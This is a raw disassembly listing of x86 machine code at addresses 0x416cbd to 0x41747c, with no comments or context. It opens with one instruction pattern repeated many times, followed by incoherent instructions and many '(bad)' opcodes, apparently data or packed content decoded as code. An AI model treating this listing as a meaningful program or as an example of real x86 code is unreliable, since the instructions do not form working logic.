  416cbd:	fld    QWORD PTR [edx+0x14b39eb5]
  416cc3:	(bad)  
  416cc4:	in     al,0xaf
  416cc6:	xor    dh,BYTE PTR [edi]
  416cc8:	push   cs
  416cc9:	dec    ecx
  416cca:	fld    QWORD PTR [edx+0x14b39eb5]
  416cd0:	(bad)  
  416cd1:	in     al,0xaf
  416cd3:	xor    dh,BYTE PTR [edi]
  416cd5:	push   cs
  416cd6:	dec    ecx
  416cd7:	fld    QWORD PTR [edx+0x14b39eb5]
  416cdd:	(bad)  
  416cde:	in     al,0xaf
  416ce0:	xor    dh,BYTE PTR [edi]
  416ce2:	push   cs
  416ce3:	dec    ecx
  416ce4:	fld    QWORD PTR [edx+0x14b39eb5]
  416cea:	(bad)  
  416ceb:	in     al,0xaf
  416ced:	xor    dh,BYTE PTR [edi]
  416cef:	push   cs
  416cf0:	dec    ecx
  416cf1:	fld    QWORD PTR [edx+0x14b39eb5]
  416cf7:	(bad)  
  416cf8:	in     al,0xaf
  416cfa:	xor    dh,BYTE PTR [edi]
  416cfc:	push   cs
  416cfd:	dec    ecx
  416cfe:	fld    QWORD PTR [edx+0x14b39eb5]
  416d04:	(bad)  
  416d05:	in     al,0xaf
  416d07:	xor    dh,BYTE PTR [edi]
  416d09:	push   cs
  416d0a:	dec    ecx
  416d0b:	fld    QWORD PTR [edx+0x14b39eb5]
  416d11:	(bad)  
  416d12:	in     al,0xaf
  416d14:	xor    dh,BYTE PTR [edi]
  416d16:	push   cs
  416d17:	dec    ecx
  416d18:	fld    QWORD PTR [edx+0x14b39eb5]
  416d1e:	(bad)  
  416d1f:	in     al,0xaf
  416d21:	xor    dh,BYTE PTR [edi]
  416d23:	push   cs
  416d24:	dec    ecx
  416d25:	fld    QWORD PTR [edx+0x14b39eb5]
  416d2b:	(bad)  
  416d2c:	in     al,0xaf
  416d2e:	xor    dh,BYTE PTR [edi]
  416d30:	push   cs
  416d31:	dec    ecx
  416d32:	fld    QWORD PTR [edx+0x14b39eb5]
  416d38:	(bad)  
  416d39:	in     al,0xaf
  416d3b:	xor    dh,BYTE PTR [edi]
  416d3d:	push   cs
  416d3e:	dec    ecx
  416d3f:	fld    QWORD PTR [edx+0x14b39eb5]
  416d45:	(bad)  
  416d46:	in     al,0xaf
  416d48:	xor    dh,BYTE PTR [edi]
  416d4a:	push   cs
  416d4b:	dec    ecx
  416d4c:	fld    QWORD PTR [edx+0x14b39eb5]
  416d52:	(bad)  
  416d53:	in     al,0xaf
  416d55:	xor    dh,BYTE PTR [edi]
  416d57:	push   cs
  416d58:	dec    ecx
  416d59:	fld    QWORD PTR [edx+0x14b39eb5]
  416d5f:	(bad)  
  416d60:	in     al,0xaf
  416d62:	xor    dh,BYTE PTR [edi]
  416d64:	push   cs
  416d65:	dec    ecx
  416d66:	fld    QWORD PTR [edx+0x14b39eb5]
  416d6c:	(bad)  
  416d6d:	in     al,0xaf
  416d6f:	xor    dh,BYTE PTR [edi]
  416d71:	push   cs
  416d72:	dec    ecx
  416d73:	fld    QWORD PTR [edx+0x14b39eb5]
  416d79:	(bad)  
  416d7a:	in     al,0xaf
  416d7c:	xor    dh,BYTE PTR [edi]
  416d7e:	push   cs
  416d7f:	dec    ecx
  416d80:	fld    QWORD PTR [edx+0x14b39eb5]
  416d86:	(bad)  
  416d87:	in     al,0xaf
  416d89:	xor    dh,BYTE PTR [edi]
  416d8b:	push   cs
  416d8c:	dec    ecx
  416d8d:	fld    QWORD PTR [edx+0x14b39eb5]
  416d93:	(bad)  
  416d94:	in     al,0xaf
  416d96:	xor    dh,BYTE PTR [edi]
  416d98:	push   cs
  416d99:	dec    ecx
  416d9a:	fld    QWORD PTR [edx+0x14b39eb5]
  416da0:	(bad)  
  416da1:	in     al,0xaf
  416da3:	xor    dh,BYTE PTR [edi]
  416da5:	push   cs
  416da6:	dec    ecx
  416da7:	fld    QWORD PTR [edx+0x14b39eb5]
  416dad:	(bad)  
  416dae:	in     al,0xaf
  416db0:	xor    dh,BYTE PTR [edi]
  416db2:	push   cs
  416db3:	dec    ecx
  416db4:	fld    QWORD PTR [edx+0x14b39eb5]
  416dba:	(bad)  
  416dbb:	in     al,0xaf
  416dbd:	xor    dh,BYTE PTR [edi]
  416dbf:	push   cs
  416dc0:	dec    ecx
  416dc1:	fld    QWORD PTR [edx+0x14b39eb5]
  416dc7:	(bad)  
  416dc8:	in     al,0xaf
  416dca:	xor    dh,BYTE PTR [edi]
  416dcc:	push   cs
  416dcd:	loop   0x416d62
  416dcf:	mov    DWORD PTR [ebp-0x62eb4c4f],esi
  416dd5:	in     al,0xaf
  416dd7:	sbb    BYTE PTR [ebp-0x329fc22c],dl
  416ddd:	xchg   BYTE PTR [eax+ebx*4+0x1a0bb02f],cl
  416de4:	mov    al,ds:0x2c104731
  416de9:	pop    esi
  416dea:	push   es
  416deb:	(bad)  
  416dec:	hlt    
  416ded:	das    
  416dee:	fs cmp al,0x24
  416df1:	jo     0x416e39
  416df3:	int3   
  416df4:	mov    bl,0x92
  416df6:	adc    eax,0x546741eb
  416dfb:	out    dx,al
  416dfc:	mov    DWORD PTR [ecx+ecx*4-0x1a],ecx
  416e00:	sub    ecx,DWORD PTR [edx]
  416e02:	aam    0xa
  416e04:	xor    eax,0xb4344e89
  416e09:	fsub   st(4),st
  416e0b:	xor    BYTE PTR [ebx+0x49],bh
  416e0e:	xchg   ecx,eax
  416e0f:	inc    ecx
  416e10:	push   ebp
  416e11:	cli    
  416e12:	mov    al,ds:0xfd79e200
  416e17:	mov    eax,0x265cc67c
  416e1c:	inc    ecx
  416e1d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  416e1f:	add    DWORD PTR [ebx-0x42],eax
  416e22:	mov    bh,0x49
  416e24:	sub    bh,BYTE PTR [ecx-0x35]
  416e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416e28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e29:	cmp    esp,DWORD PTR [ebx-0x70adbdde]
  416e2f:	stos   BYTE PTR es:[edi],al
  416e30:	mov    dh,0x9a
  416e32:	ss ja  0x416e30
  416e35:	outs   dx,DWORD PTR ds:[esi]
  416e36:	mov    ecx,0x8be35a3f
  416e3b:	inc    ecx
  416e3c:	cmp    dl,BYTE PTR [eax]
  416e3e:	shl    DWORD PTR [ebx+0x2f],cl
  416e41:	push   ss
  416e42:	pop    esp
  416e43:	mov    eax,0x90ba3f20
  416e48:	xchg   BYTE PTR [ecx+0x7f],ch
  416e4b:	int    0x49
  416e4d:	cs in  eax,dx
  416e4f:	fdivp  st(1),st
  416e51:	xlat   BYTE PTR ds:[ebx]
  416e52:	and    eax,0xff894135
  416e57:	or     BYTE PTR [ecx-0x2375569c],0x9a
  416e5e:	or     ecx,DWORD PTR [edx+ebp*4-0x74]
  416e62:	xor    al,0x17
  416e64:	xchg   edx,eax
  416e65:	and    DWORD PTR [ecx],0xffffffc4
  416e68:	fnstcw WORD PTR [ebx+esi*8-0x68]
  416e6c:	repz mov esp,0x2d474c48
  416e72:	pusha  
  416e73:	rcr    DWORD PTR [ebp-0x49f75a40],0xe9
  416e7a:	jmp    0x9b84:0x20b00972
  416e81:	pop    edi
  416e82:	mov    edx,0x700a50a1
  416e87:	dec    ecx
  416e88:	nop
  416e89:	js     0x416e48
  416e8b:	inc    ebx
  416e8c:	pop    es
  416e8d:	imul   edx,DWORD PTR [ecx+ebp*8-0x15cdcf26],0xffffff8d
  416e95:	cmp    BYTE PTR [edi],bh
  416e97:	push   eax
  416e98:	dec    esp
  416e99:	jbe    0x416ee0
  416e9b:	(bad)  
  416e9c:	pop    esi
  416e9d:	repz dec esp
  416e9f:	cmp    DWORD PTR [ebp-0x3],0x13
  416ea3:	nop
  416ea4:	or     BYTE PTR [edi+0x6115375d],0xbd
  416eab:	inc    edi
  416eac:	imul   eax,DWORD PTR [edx+0x64556afd],0x9bfe476c
  416eb6:	adc    ecx,ecx
  416eb8:	push   ebx
  416eb9:	sbb    dl,BYTE PTR [ebx-0x4a]
  416ebc:	xor    eax,0xdea2b0c8
  416ec1:	cld    
  416ec2:	lea    ebp,[ecx+0x53487122]
  416ec8:	mov    bl,0x6c
  416eca:	and    al,0x59
  416ecc:	shr    DWORD PTR [ebx-0x62],0xd9
  416ed0:	xchg   esp,eax
  416ed1:	mov    bh,0x32
  416ed3:	mov    bh,0x1a
  416ed5:	lea    esi,[edx+0xa248ffe]
  416edb:	mov    ebp,?
  416edd:	jmp    0x416ec8
  416edf:	fisttp QWORD PTR [eax-0x61]
  416ee2:	push   edx
  416ee3:	mov    al,ds:0x75adfa2a
  416ee8:	cdq    
  416ee9:	jp     0x416f24
  416eeb:	and    al,0x62
  416eed:	cmp    al,0x66
  416eef:	inc    eax
  416ef0:	es shr ebp,0xe5
  416ef4:	push   esi
  416ef5:	mov    ebx,0xb4f9cef6
  416efa:	daa    
  416efb:	stc    
  416efc:	cli    
  416efd:	imul   edx,DWORD PTR [ebx+0x50],0x55c4f9ec
  416f04:	or     BYTE PTR [edx],bh
  416f06:	add    DWORD PTR [edx],edx
  416f08:	icebp  
  416f09:	jge    0x416f4c
  416f0b:	in     eax,0x61
  416f0d:	mov    al,0xd9
  416f0f:	dec    DWORD PTR [ebx-0x6d556641]
  416f15:	mov    ds:0x6dac6013,eax
  416f1a:	shl    BYTE PTR [edx],1
  416f1c:	jns    0x416f91
  416f1e:	int3   
  416f1f:	mov    ds:0x7cc0f573,al
  416f24:	push   eax
  416f25:	dec    esp
  416f26:	dec    ebx
  416f27:	cmp    dh,bh
  416f29:	sbb    eax,0xa87780ba
  416f2e:	das    
  416f2f:	ins    DWORD PTR es:[edi],dx
  416f30:	push   es
  416f31:	sub    DWORD PTR [eax-0x37],eax
  416f34:	add    al,BYTE PTR [ebx+0x46]
  416f37:	mov    eax,0xcbb56e80
  416f3c:	cs dec esi
  416f3e:	cmp    BYTE PTR [ebx+0x75],bl
  416f41:	push   edx
  416f42:	xlat   BYTE PTR ds:[ebx]
  416f43:	invd   
  416f45:	push   esp
  416f46:	cdq    
  416f47:	jge    0x416f2e
  416f49:	pop    ebp
  416f4a:	jo     0x416f2d
  416f4c:	imul   ecx,DWORD PTR [ebx-0x2ab901f6],0x9600d2de
  416f56:	sub    BYTE PTR [ebx+0x41],dh
  416f59:	mov    edx,0xffd919c2
  416f5e:	les    ebx,FWORD PTR [esi+0x79]
  416f61:	add    al,0x66
  416f63:	jle    0x416f16
  416f65:	pop    edi
  416f66:	lea    esi,[edx+0x2]
  416f69:	aam    0xe6
  416f6b:	(bad)  
  416f6c:	or     eax,0x64fc170b
  416f71:	xlat   BYTE PTR ds:[ebx]
  416f72:	jo     0x416f04
  416f74:	dec    edx
  416f75:	jbe    0x416fd9
  416f77:	mov    ch,0xb3
  416f79:	pop    ss
  416f7a:	adc    eax,0x6fd128b9
  416f7f:	sbb    esp,DWORD PTR [esi-0x33d365b2]
  416f85:	fisttp QWORD PTR [esp+edx*1+0x3ab72423]
  416f8c:	jmp    0x416fef
  416f8e:	lods   eax,DWORD PTR ds:[esi]
  416f8f:	in     al,0x7a
  416f91:	fsub   DWORD PTR [eax+0x69]
  416f94:	push   edx
  416f95:	ret    
  416f96:	hlt    
  416f97:	add    ecx,eax
  416f99:	leave  
  416f9a:	dec    ecx
  416f9b:	and    DWORD PTR [edx],edi
  416f9d:	xchg   BYTE PTR [esi+0xb700fe0],cl
  416fa3:	ins    BYTE PTR es:[edi],dx
  416fa4:	cmc    
  416fa5:	test   esp,ebx
  416fa7:	add    BYTE PTR [ecx+0x1a],bl
  416faa:	and    DWORD PTR [ecx+ecx*8+0x39],0x47
  416faf:	aad    0x1c
  416fb1:	das    
  416fb2:	out    0x97,al
  416fb4:	xchg   esp,eax
  416fb5:	(bad)  
  416fb6:	cli    
  416fb7:	popa   
  416fb8:	in     al,0xb3
  416fba:	sbb    ebx,DWORD PTR [esi+eax*4+0x7c8c8228]
  416fc1:	adc    esi,edi
  416fc3:	push   cs
  416fc4:	scas   eax,DWORD PTR es:[edi]
  416fc5:	neg    DWORD PTR [ebx]
  416fc7:	push   ebx
  416fc8:	jmp    0xc4cf:0x9e6a5c3
  416fcf:	mov    bh,0x9b
  416fd1:	push   0xffffffc0
  416fd3:	aam    0xbd
  416fd5:	fcomp  QWORD PTR [eax]
  416fd7:	mov    ds:0x9f696ee6,eax
  416fdc:	pusha  
  416fdd:	add    eax,0xd1e1cdcf
  416fe2:	dec    esp
  416fe3:	popa   
  416fe4:	ror    DWORD PTR ds:0xb77638e3,1
  416fea:	shl    BYTE PTR [esi-0x65445d78],1
  416ff0:	push   edi
  416ff1:	xchg   DWORD PTR [ecx+ecx*2-0x22],ebp
  416ff5:	(bad)  
  416ff7:	push   cs
  416ff8:	mov    al,ds:0x6cb174d6
  416ffd:	add    DWORD PTR [edx+0x24],esp
  417000:	pop    ebp
  417001:	jnp    0x417057
  417003:	int3   
  417004:	aaa    
  417005:	outs   dx,DWORD PTR ds:[esi]
  417006:	inc    ecx
  417007:	imul   edi,DWORD PTR [ebp+0x1f38745a],0x62
  41700e:	dec    eax
  41700f:	xor    eax,0x45af3a1b
  417014:	mov    ah,0x2a
  417016:	inc    eax
  417017:	xor    al,0xc7
  417019:	sahf   
  41701a:	cmp    BYTE PTR [eax],al
  41701c:	mov    WORD PTR [esi],?
  41701e:	jns    0x416fa8
  417020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417021:	cli    
  417022:	popa   
  417023:	icebp  
  417024:	cs icebp 
  417026:	push   eax
  417027:	ja     0x41701e
  417029:	fist   WORD PTR fs:[edx]
  41702c:	retf   
  41702d:	jmp    0x417072
  41702f:	cmp    al,0x8a
  417031:	lock loop 0x41702f
  417034:	mov    bl,0x20
  417036:	jmp    0x2754cdac
  41703b:	or     ebp,0xffffffd7
  41703e:	add    al,0xf4
  417040:	add    esp,edx
  417042:	fldenv [edi+edi*8]
  417045:	test   al,0xe7
  417047:	add    DWORD PTR [edx-0x51e3d575],0x77
  41704e:	psubusb mm3,QWORD PTR [ebx]
  417051:	call   0x6bb83a9b
  417056:	and    cl,BYTE PTR [ecx]
  417058:	stos   BYTE PTR es:[edi],al
  417059:	loope  0x416fe9
  41705b:	sbb    DWORD PTR [ebx+0x12635ca],edx
  417061:	sub    dl,BYTE PTR [edi-0x6cc629e]
  417067:	ja     0x41701a
  417069:	mov    al,0x7b
  41706c:	in     al,dx
  41706d:	cmc    
  41706e:	(bad)  
  41706f:	cmp    al,0x3d
  417071:	mov    ecx,0x337f9133
  417076:	mov    eax,0x974eed15
  41707b:	cmp    BYTE PTR [eax],dl
  41707d:	jmp    0x164b3ccf
  417082:	(bad)  
  417083:	in     eax,0xab
  417085:	retf   
  417086:	je     0x417011
  417088:	xchg   esi,edi
  41708a:	xchg   esi,eax
  41708b:	mov    cl,0x35
  41708d:	out    dx,eax
  41708e:	sub    dl,al
  417090:	xchg   ebp,eax
  417091:	push   edi
  417092:	(bad)
  417097:	mov    ds:0x6572a48b,eax
  41709c:	xor    eax,0x10fc1e9c
  4170a1:	shl    BYTE PTR [edi+eax*1+0x6b953e15],0xd8
  4170a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170aa:	inc    ebx
  4170ab:	in     al,dx
  4170ac:	jnp    0x4170bb
  4170ae:	sti    
  4170af:	ficomp WORD PTR [edi-0xf]
  4170b2:	sub    DWORD PTR [ebx+ebp*1],edi
  4170b5:	popf   
  4170b6:	jg     0x4170c4
  4170b8:	fdiv   QWORD PTR [ecx]
  4170ba:	xor    eax,0x5050c5d2
  4170bf:	mov    cs:0x36914410,al
  4170c5:	pop    ecx
  4170c6:	xor    BYTE PTR [edi+0x18],dh
  4170c9:	pop    ds
  4170ca:	(bad)  
  4170cb:	div    eax
  4170cd:	push   0x41f9d55
  4170d2:	sbb    ebp,DWORD PTR [edx-0x2b441ce6]
  4170d8:	and    DWORD PTR [eax],ecx
  4170da:	fdiv   st(2),st
  4170dc:	pop    esp
  4170dd:	shl    DWORD PTR [esi+edx*1+0x19],cl
  4170e1:	int    0xed
  4170e3:	out    dx,eax
  4170e4:	sbb    eax,DWORD PTR [ebp+0x254db562]
  4170ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170eb:	push   ds
  4170ec:	cli    
  4170ed:	(bad)  [edi+0x17c704c6]
  4170f3:	adc    DWORD PTR [edi-0x43c42510],edx
  4170f9:	outs   dx,DWORD PTR ds:[esi]
  4170fa:	push   ebx
  4170fb:	sbb    eax,0x539c046
  417100:	int    0xe6
  417102:	mov    edi,0x7c63eb3e
  417107:	stos   DWORD PTR es:[edi],eax
  417108:	mov    bl,0xdf
  41710a:	in     eax,0x67
  41710c:	ss gs push 0x33
  417110:	sti    
  417111:	push   ebp
  417112:	ins    DWORD PTR es:[edi],dx
  417113:	mov    ?,WORD PTR ds:0xa25455aa
  417119:	adc    DWORD PTR [eax+edi*4-0x73],ecx
  41711d:	sub    bl,BYTE PTR [edi+0x28]
  417120:	out    dx,al
  417121:	push   0x23
  417123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417124:	stos   BYTE PTR es:[edi],al
  417125:	jb     0x4170e4
  417127:	xlat   BYTE PTR ds:[ebx]
  417128:	ss out dx,al
  41712a:	pop    eax
  41712b:	sbb    al,BYTE PTR [ebp+0x43]
  41712e:	mov    dl,0x90
  417130:	aam    0xbb
  417132:	loopne 0x4170e4
  417134:	cld    
  417135:	pop    ss
  417136:	push   edi
  417137:	xchg   ebp,eax
  417138:	std    
  417139:	push   ebx
  41713a:	sbb    BYTE PTR [ebx],0xe0
  41713d:	int    0x47
  41713f:	std    
  417140:	inc    ebx
  417141:	test   eax,0xa673197f
  417146:	sub    eax,0xe0f8baa2
  41714b:	lds    edi,FWORD PTR [ecx+0x4b]
  41714e:	sbb    eax,0x47e7c180
  417153:	pusha  
  417154:	loope  0x41717f
  417156:	iret   
  417157:	mov    ch,0x82
  417159:	mov    ds:0xa035c33a,al
  41715e:	dec    esi
  41715f:	cmp    BYTE PTR [ebp-0x4053a43d],bh
  417165:	xchg   ebx,ebx
  417167:	leave  
  417168:	cmp    eax,0x63202889
  41716d:	outs   dx,DWORD PTR ds:[esi]
  41716e:	mul    DWORD PTR [ebx+edi*8]
  417171:	xchg   DWORD PTR [ecx+0x26],eax
  417174:	lock pop ebx
  417176:	dec    esi
  417177:	cli    
  417178:	mov    ecx,0x6fb22cdb
  41717d:	inc    eax
  41717e:	cld    
  41717f:	das    
  417180:	hlt    
  417181:	loopne 0x41719e
  417183:	mov    eax,ss
  417185:	rol    DWORD PTR [ebx+0x30],0x33
  417189:	stc    
  41718a:	popa   
  41718b:	xchg   esp,eax
  41718c:	sub    DWORD PTR [ebx+0x713483d4],esi
  417192:	shr    BYTE PTR [ebx],0x4e
  417195:	jmp    0xa0fdcafa
  41719a:	inc    esp
  41719b:	(bad)  
  41719c:	jmp    0x3658:0x8c10c09
  4171a3:	xchg   ebx,eax
  4171a4:	mov    WORD PTR ds:0x1ac7c369,ss
  4171aa:	adc    ebp,DWORD PTR ds:0xab1ddfda
  4171b0:	sub    ch,bh
  4171b2:	push   eax
  4171b3:	popf   
  4171b4:	in     al,0x2a
  4171b6:	shl    DWORD PTR [esi+0x1],0x59
  4171ba:	mov    bh,0x17
  4171bc:	(bad)  
  4171be:	into   
  4171bf:	dec    esp
  4171c0:	(bad)  [esi-0x9]
  4171c3:	pushf  
  4171c4:	and    al,0xf8
  4171c6:	jnp    0x417161
  4171c8:	xchg   esp,eax
  4171c9:	clc    
  4171ca:	rcl    BYTE PTR [esi+ebp*2],0xd6
  4171ce:	and    eax,DWORD PTR [bp+di+0x35]
  4171d2:	mov    BYTE PTR [edi+0x41],bl
  4171d5:	push   ss
  4171d6:	push   ecx
  4171d7:	int3   
  4171d8:	ins    DWORD PTR es:[edi],dx
  4171d9:	mov    al,ds:0x9eaeca20
  4171de:	leave  
  4171df:	cdq    
  4171e0:	jl     0x417190
  4171e2:	test   eax,0xf33df3ed
  4171e7:	test   edx,edi
  4171e9:	jp     0x417232
  4171eb:	add    esi,DWORD PTR [edx+0x3c70d9eb]
  4171f1:	shr    BYTE PTR ds:0x20fa5931,0xd4
  4171f8:	mov    dl,BYTE PTR [eax]
  4171fa:	not    BYTE PTR [ecx+0x80e400e]
  417200:	or     bh,BYTE PTR [ecx-0x50]
  417203:	lods   al,BYTE PTR ds:[esi]
  417204:	mov    esp,0x692fffce
  417209:	repz sub DWORD PTR [edx+0x20658d12],ebp
  417210:	cwde   
  417211:	xor    al,0xfe
  417213:	mov    eax,ds:0x57314189
  417218:	cli    
  417219:	sub    DWORD PTR [ecx+0x65],ebp
  41721c:	xchg   edx,eax
  41721d:	and    dl,BYTE PTR [esi]
  41721f:	sti    
  417220:	pusha  
  417221:	pop    ebx
  417222:	xchg   esi,eax
  417223:	jmp    0x4171d2
  417225:	cmp    DWORD PTR ds:0xfad60a20,eax
  41722b:	daa    
  41722c:	enter  0x78bb,0x27
  417230:	xor    eax,0x6e0668d7
  417235:	jmp    0x860d0c8e
  41723a:	ror    DWORD PTR [edx+0x7a96b0d5],0xff
  417241:	repnz sub dh,BYTE PTR [edi]
  417244:	cld    
  417245:	pop    ebp
  417246:	sbb    eax,0x7e38e45
  41724b:	sbb    eax,0x62472fb7
  417250:	pop    edi
  417251:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417252:	mov    eax,ds:0x1e751d3e
  417257:	imul   ebx,DWORD PTR [ebx-0x9],0x2dbb8d64
  41725e:	push   esp
  41725f:	stos   BYTE PTR es:[edi],al
  417260:	es inc esp
  417262:	add    eax,0xb50ed78a
  417267:	outs   dx,DWORD PTR ds:[esi]
  417268:	pop    es
  417269:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41726a:	xor    ah,BYTE PTR [ebx-0x32a67d23]
  417270:	pop    es
  417271:	xchg   ecx,eax
  417272:	retf   
  417273:	push   ebx
  417274:	je     0x4172db
  417276:	test   eax,0x3ffbd73b
  41727b:	(bad)  
  41727c:	(bad)  
  41727d:	out    dx,eax
  41727e:	push   ecx
  41727f:	rcr    DWORD PTR [edi],cl
  417281:	xchg   ecx,eax
  417282:	pop    ebp
  417283:	mov    ecx,0x51b698db
  417288:	adc    DWORD PTR [ecx+0x5c],0xcc5b9839
  41728f:	xor    eax,0x975153de
  417294:	xchg   edi,eax
  417295:	sbb    DWORD PTR [edx-0x24772cd9],esp
  41729b:	mov    ds,WORD PTR [esi-0x7b]
  41729e:	popf   
  41729f:	add    BYTE PTR [ecx+0x0],dl
  4172a2:	mov    eax,0x8a7b4de6
  4172a7:	int3   
  4172a8:	or     ah,BYTE PTR [esi+0x2d]
  4172ab:	lods   eax,DWORD PTR ds:[esi]
  4172ac:	mov    esp,0xf3df5db2
  4172b1:	add    eax,0x17290560
  4172b6:	imul   edx,eax,0xbd11857d
  4172bc:	jle    0x417318
  4172be:	(bad)  
  4172bf:	scas   al,BYTE PTR es:[edi]
  4172c0:	dec    edi
  4172c1:	push   esi
  4172c2:	into   
  4172c3:	xor    ch,BYTE PTR [edx]
  4172c5:	sub    bl,cl
  4172c7:	aaa    
  4172c8:	mov    al,ds:0x363fb54f
  4172cd:	ins    BYTE PTR es:[edi],dx
  4172ce:	outs   dx,DWORD PTR ds:[esi]
  4172cf:	inc    esp
  4172d0:	retf   0x7536
  4172d3:	in     al,0xc6
  4172d5:	out    dx,al
  4172d6:	pop    es
  4172d7:	les    ebx,FWORD PTR [ebp+0x52]
  4172da:	sub    DWORD PTR [eax+edi*4],ebp
  4172dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172de:	sub    BYTE PTR [edx+0x10],0xd7
  4172e2:	fimul  DWORD PTR [eax]
  4172e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172e5:	xor    al,0xa9
  4172e7:	fisttp WORD PTR [eax-0x27ae5d11]
  4172ed:	adc    edx,edi
  4172ef:	imul   ebx,DWORD PTR [ebp-0x7b],0x2ef517cc
  4172f6:	hlt    
  4172f7:	stos   BYTE PTR es:[edi],al
  4172f8:	cmc    
  4172f9:	scas   eax,DWORD PTR es:[edi]
  4172fa:	inc    edi
  4172fb:	push   edx
  4172fc:	xchg   edi,eax
  4172fd:	or     al,al
  4172ff:	imul   esi,DWORD PTR [ebx+0x213fdf5d],0xffffff83
  417306:	(bad)
  417309:	xchg   edi,eax
  41730a:	in     al,0xdb
  41730c:	outs   dx,DWORD PTR ds:[esi]
  41730d:	push   edx
  41730e:	mov    ebx,0x9eac5088
  417313:	repz ss sbb dh,bl
  417317:	mov    edi,0x59a55629
  41731c:	jne    0x417340
  41731e:	dec    esi
  41731f:	dec    esi
  417320:	mov    ds:0xab5d365e,eax
  417325:	iret   
  417326:	in     al,0x7e
  417328:	test   ah,dl
  41732a:	dec    edx
  41732b:	sbb    eax,0x578f0742
  417330:	das    
  417331:	ret    0x96aa
  417334:	leave  
  417335:	xor    al,BYTE PTR ds:[edx-0x1f555328]
  41733c:	mov    bl,0x7e
  41733e:	sub    esi,DWORD PTR [esi]
  417340:	jb     0x4172d5
  417342:	push   0xfffffffd
  417344:	xchg   DWORD PTR [edx],ecx
  417346:	jnp    0x41739c
  417348:	jmp    0x417310
  41734a:	xchg   BYTE PTR [ecx+0xbfeed],dl
  417350:	xor    ah,dh
  417352:	mov    dl,0x34
  417354:	jp     0x417371
  417356:	xchg   DWORD PTR [ebx+0x72a2190e],ebp
  41735c:	adc    eax,edi
  41735e:	mov    ch,0x6c
  417360:	xor    BYTE PTR [eax+0x7c],bh
  417363:	out    0x88,al
  417365:	jl     0x4173df
  417367:	sub    al,0xcc
  417369:	shl    ebx,0xfd
  41736c:	popa   
  41736d:	pusha  
  41736e:	pop    es
  41736f:	sub    cl,BYTE PTR [ebp+0x641c0e67]
  417375:	scas   al,BYTE PTR es:[edi]
  417376:	int    0x1b
  417378:	and    al,ah
  41737a:	sbb    DWORD PTR [ebx+0x5b],esi
  41737d:	sbb    eax,0x74debb84
  417382:	push   ss
  417383:	cs imul esi,edx,0x54ca7cc4
  41738a:	mov    DWORD PTR [ebx+edx*2+0x79f49b82],ebx
  417391:	arpl   WORD PTR [ebp+0xd],si
  417394:	aaa    
  417395:	xlat   BYTE PTR ds:[ebx]
  417396:	dec    eax
  417397:	and    esi,eax
  417399:	pop    eax
  41739a:	loopne 0x4173c5
  41739c:	mov    cl,0x3
  41739e:	jne    0x417409
  4173a0:	cwde   
  4173a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4173a2:	mov    dh,0x6c
  4173a4:	sbb    ebx,DWORD PTR [esi]
  4173a6:	jmp    0xd488ed25
  4173ab:	jb     0x41735e
  4173ad:	jnp    0x417383
  4173af:	pop    edi
  4173b0:	sti    
  4173b1:	cmp    ch,bh
  4173b3:	and    BYTE PTR [edi-0x125b06a5],bl
  4173b9:	fsub   st(6),st
  4173bb:	jo     0x41739e
  4173bd:	(bad)  
  4173be:	push   ecx
  4173bf:	dec    ebx
  4173c0:	int3   
  4173c1:	ror    BYTE PTR [ecx],0x79
  4173c4:	push   esi
  4173c5:	inc    edi
  4173c6:	cmc    
  4173c7:	sub    al,0x1d
  4173c9:	rcr    DWORD PTR [esp+ecx*1+0x1f78f4b5],1
  4173d0:	jl     0x41743d
  4173d2:	cmp    eax,0xcc157104
  4173d7:	int    0xd2
  4173d9:	and    al,0x21
  4173db:	xchg   DWORD PTR ds:0xed6ff21b,ebx
  4173e1:	aas    
  4173e2:	aaa    
  4173e3:	add    eax,0xb2f874e4
  4173e8:	loope  0x4173d8
  4173ea:	loope  0x4173d6
  4173ec:	cld    
  4173ed:	or     al,BYTE PTR ds:0xa66abccd
  4173f3:	pop    esp
  4173f4:	xchg   DWORD PTR [edx],ebx
  4173f6:	in     al,0x48
  4173f8:	mov    ebp,0xe4eb7eac
  4173fd:	mov    eax,0x818f3d9c
  417402:	fldcw  WORD PTR ds:0x572905b9
  417408:	out    0xc6,al
  41740a:	ds mov edi,0xf2b8911b
  417410:	inc    esp
  417411:	cs (bad) 
  417413:	scas   eax,DWORD PTR es:[edi]
  417414:	push   eax
  417415:	or     eax,0x39385439
  41741a:	je     0x41747a
  41741c:	xor    ebx,esp
  41741e:	in     eax,dx
  41741f:	(bad)  
  417420:	ds leave 
  417422:	jno    0x41749a
  417424:	mov    bl,0x35
  417426:	jecxz  0x4173b8
  417428:	push   ds
  417429:	inc    eax
  41742a:	dec    ecx
  41742b:	push   ebx
  41742c:	add    BYTE PTR ds:0x26dbf236,bl
  417432:	fsub   QWORD PTR [eax-0x7bd36a62]
  417438:	sub    edi,DWORD PTR [ebp+edi*1+0x6f78ff15]
  41743f:	push   ebx
  417440:	push   0x22
  417442:	add    al,0xb9
  417444:	or     eax,DWORD PTR [edi]
  417446:	mov    dh,0xd8
  417448:	and    ecx,DWORD PTR [ecx]
  41744a:	jge    0x41749f
  41744c:	cwde   
  41744d:	ins    BYTE PTR es:[edi],dx
  41744e:	mov    dl,0x39
  417450:	aaa    
  417451:	fimul  DWORD PTR [edi+0x661af816]
  417457:	push   ecx
  417458:	neg    BYTE PTR [eax-0x23fa5e2e]
  41745e:	dec    edi
  41745f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417460:	bound  ebx,QWORD PTR [edi+0x3f]
  417463:	into   
  417464:	push   0x76
  417466:	frndint 
  417468:	mov    BYTE PTR [esi+0x3114bce1],al
  41746e:	xchg   DWORD PTR [esi-0xfc8d58c],eax
  417474:	rol    DWORD PTR [esi+0x44],cl
  417477:	in     eax,0xd
  417479:	xor    DWORD PTR [ebx+0x5a],esp
  41747c:	js     0x417499
